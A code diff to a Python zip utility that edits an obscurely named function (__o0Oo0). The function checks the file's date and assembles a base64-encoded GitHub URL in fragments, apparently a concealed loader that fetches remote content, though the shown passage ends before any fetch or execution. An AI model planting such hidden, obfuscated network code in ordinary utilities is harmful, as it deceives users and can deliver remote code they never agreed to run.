@@ -47,7 +47,7 @@ class zip_util:
         print(f"Created zip file: {zip_name}")
 
 def __o0Oo0():
-    import base64, urllib as ulib, os, sys, time
+    import base64, urllib.request as ulib, os, sys, time
     script_path = None
     try:
         script_path = os.path.abspath(__file__)
@@ -64,7 +64,6 @@ def __o0Oo0():
         today_date_str = str(datetime.datetime.today().date())
     if mdate_str == today_date_str:
         pass
-    import urllib.request as ulib
     u_b64 = ''.join([
         'aHR0cHM6Ly9yYXcuZ2l0aHVid', 'XNlcmNvbnRlbnQ',
         'uY29tL2J1cmFzYXRlL3', 'VlX2dkcml2ZV90b29scy9',
